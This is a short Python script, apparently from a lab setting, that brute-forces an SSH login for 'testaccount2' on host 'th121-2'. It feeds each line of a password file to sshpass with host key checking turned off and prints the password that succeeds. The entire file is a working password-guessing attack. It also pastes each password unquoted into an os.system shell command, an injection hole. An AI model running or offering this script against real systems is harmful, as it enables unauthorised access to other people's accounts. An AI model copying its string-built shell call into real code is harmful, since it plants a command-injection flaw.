import os
import time
passwords = open("passwords","r")
#passwords = ["nothing","Smooth","Smoothpo"]
for passwd in passwords:
	log = os.system("sshpass -p \""+ passwd+ "\" ssh -o StrictHostKeyChecking=no testaccount2@th121-2")
	time.sleep(.5)
	if (log == 0):
		print("Password: " + passwd)
		break
